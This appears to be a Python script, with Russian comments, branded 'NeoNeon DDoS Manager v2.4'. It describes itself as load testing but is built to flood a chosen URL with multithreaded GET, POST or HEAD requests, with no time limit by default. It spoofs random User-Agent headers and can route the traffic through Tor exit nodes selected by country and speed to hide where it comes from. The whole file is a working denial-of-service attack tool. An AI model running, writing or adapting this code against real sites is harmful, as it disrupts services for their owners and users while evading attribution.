import requests
import threading
import time
import argparse
from colorama import Fore, Style, init
from fake_useragent import UserAgent
import json
import subprocess
import random
from tqdm import tqdm

# === Инициализация ===
init(autoreset=True)
ua = UserAgent()

# === Цвета ===
RESET = Style.RESET_ALL
GREEN = Fore.LIGHTGREEN_EX
RED = Fore.LIGHTRED_EX
CYAN = Fore.LIGHTCYAN_EX
YELLOW = Fore.LIGHTYELLOW_EX
MAGENTA = Fore.LIGHTMAGENTA_EX
BLUE = Fore.LIGHTBLUE_EX

# === ASCII баннер ===
def show_banner():
    banner = f"""
{Fore.MAGENTA}██╗░░██╗██╗░█████╗░██╗░░██╗███████╗███╗░░██╗
{Fore.CYAN}██║░░██║██║██╔══██╗██║░░██║██╔════╝████╗░██║
{Fore.BLUE}███████║██║██║░░╚═╝███████║█████╗░░██╔██╗██║
{Fore.GREEN}██╔══██║██║██║░░██╗██╔══██║██╔══╝░░██║╚████║
{Fore.YELLOW}██║░░██║██║╚█████╔╝██║░░██║███████╗██║░╚███║
{Fore.RED}╚═╝░░╚═╝╚═╝░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚══╝

{Fore.WHITE}███╗░░░███╗██████╗░██████╗░░█████╗░░██████╗
{Fore.LIGHTWHITE_EX}╚████╗░████║╚════╗██╔════╝░██╔══██╗██╔════╝
{Fore.LIGHTCYAN_EX}░╚███╗███║░░░███╔╝██║░░██╗░███████║╚█████╗░
{Fore.LIGHTGREEN_EX}░██╔████║░░░╚══╝░██║░░╚██╗██╔══██║░╚═══██╗
{Fore.LIGHTYELLOW_EX}██╔╝╚██╔╝░░░███╗░╚██████╔╝██║░░██║██████╔╝
{Fore.LIGHTRED_EX}╚═╝░░╚═╝░░░░╚══╝░░╚═════╝░╚═╝░░╚═╝╚═════╝░

      {Style.BRIGHT}{Fore.CYAN}NeoNeon DDoS Manager v2.4
      {Fore.LIGHTBLACK_EX}@author: NeoDelux | https://github.com/NeoDelux/neoneon
"""
    print(banner)

# === Парсер аргументов ===
def parse_args():
    parser = argparse.ArgumentParser(description="NeoNeon DDoS Manager — мощный инструмент нагрузочного тестирования")
    parser.add_argument("-u", "--url", required=True, help="Целевой URL (например, https://example.com)")
    parser.add_argument("-t", "--threads", type=int, default=50, help="Количество потоков (по умолчанию: 50)")
    parser.add_argument("-d", "--duration", type=int, default=0, help="Длительность теста в секундах (0 — бесконечно)")
    parser.add_argument("--method", default="get", choices=["get", "post", "head"], help="Тип запроса: get/post/head")
    parser.add_argument("--use-tor", action="store_true", help="Использовать Tor вместо других прокси")
    parser.add_argument("--country", default=None, help="ISO код страны (например, RU, US, DE)")
    parser.add_argument("--auto-select-best", action="store_true",
                        help="Автоматически выбрать самый быстрый выходной узел Tor")
    parser.add_argument("--user-agent", default="random", help="Указать свой User-Agent (или random)")
    return parser.parse_args()

# === Получение списка выходных нод ===
def fetch_exit_nodes(country_code=None):
    url = "https://onionoo.torproject.org/details"
    params = {"fields": "a,f,n,country", "running": "true"}
    res = requests.get(url, params=params).json()
    exits = []

    for relay in res.get("relays", []):
        if "Exit" in relay.get("f", "").split(","):
            ip_ports = relay.get("a", [])
            country = relay.get("country", None)
            if ip_ports and (country_code is None or country == country_code.upper()):
                exits.append(ip_ports[0])

    return exits

# === Выбрать самый быстрый узел ===
def select_fastest_node(nodes, target_url):
    results = []
    print(f"{BLUE}[~] Проверяем скорость {len(nodes)} узлов...")

    for node in tqdm(nodes, desc="Тестирование узлов", bar_format="{l_bar}%s{bar}%s{r_bar}" % (Fore.CYAN, Fore.RESET)):
        try:
            session = requests.Session()
            session.proxies = {
                "http": f"socks5://{node}",
                "https": f"socks5://{node}"
            }
            start = time.time()
            session.get(target_url, timeout=5)
            delay = time.time() - start
            results.append((node, delay))
        except:
            continue

    results.sort(key=lambda x: x[1])
    return results[0][0] if results else None

# === Функция атаки ===
def attack(url, stop_flag, user_agent, method="get", proxy=None):
    headers = {"User-Agent": user_agent}

    while not stop_flag[0]:
        try:
            proxies = {"http": f"socks5://{proxy}", "https": f"socks5://{proxy}"} if proxy else None
            if method == "get":
                response = requests.get(url, headers=headers, proxies=proxies, timeout=10)
            elif method == "post":
                response = requests.post(url, data={"test": "load"}, headers=headers, proxies=proxies, timeout=10)
            elif method == "head":
                response = requests.head(url, headers=headers, proxies=proxies, timeout=10)
            print(f"{GREEN}[✓] {method.upper()} → {response.status_code} via {proxy if proxy else 'direct'}")
        except Exception as e:
            print(f"{RED}[✕] Ошибка: {str(e)}")

# === Основная функция запуска ===
def main():
    show_banner()
    args = parse_args()

    url = args.url
    threads_count = args.threads
    duration = args.duration
    method = args.method
    user_agent = ua.random if args.user_agent == "random" else args.user_agent

    print(f"{CYAN}[+] Используется User-Agent: {user_agent}")
    print(f"{YELLOW}[!] Цель: {url}")
    print(f"{YELLOW}[!] Метод: {method.upper()}")
    print(f"{YELLOW}[!] Кол-во потоков: {threads_count}")
    print(f"{YELLOW}[!] Длительность: {'∞' if duration == 0 else f'{duration} сек'}\n")

    selected_proxy = None

    if args.use_tor:
        print(f"{MAGENTA}[+] Поиск выходных нод Tor...")
        nodes = fetch_exit_nodes(args.country)

        if not nodes:
            print(f"{RED}[-] Не найдено подходящих нод.")
            exit(1)

        print(f"{CYAN}[+] Найдено выходных нод: {len(nodes)}")

        if args.auto_select_best:
            selected_proxy = select_fastest_node(nodes, url)
            print(f"{GREEN}[+] Используется лучший узел: {selected_proxy}")
        else:
            selected_proxy = random.choice(nodes)
            print(f"{CYAN}[i] Используется случайный узел: {selected_proxy}")

    stop_flag = [False]
    threads = []

    def countdown():
        for i in range(duration, 0, -1):
            print(f"\r{BLUE}[⏳] Осталось времени: {i}s", end="")
            time.sleep(1)
        stop_flag[0] = True
        print("\n")

    if duration > 0:
        threading.Thread(target=countdown, daemon=True).start()

    for _ in range(threads_count):
        t = threading.Thread(
            target=attack,
            args=(url, stop_flag, user_agent, method, selected_proxy),
            daemon=True
        )
        threads.append(t)
        t.start()

    try:
        input(f"{MAGENTA}\n[INFO] Нажмите Enter для остановки...\n")
        stop_flag[0] = True
    except KeyboardInterrupt:
        stop_flag[0] = True
        print(f"\n{RED}[!] Прервано пользователем.")

    for t in threads:
        t.join(timeout=1)

    print(f"{GREEN}[✓] Тест завершён.\n")


if __name__ == "__main__":
    main()
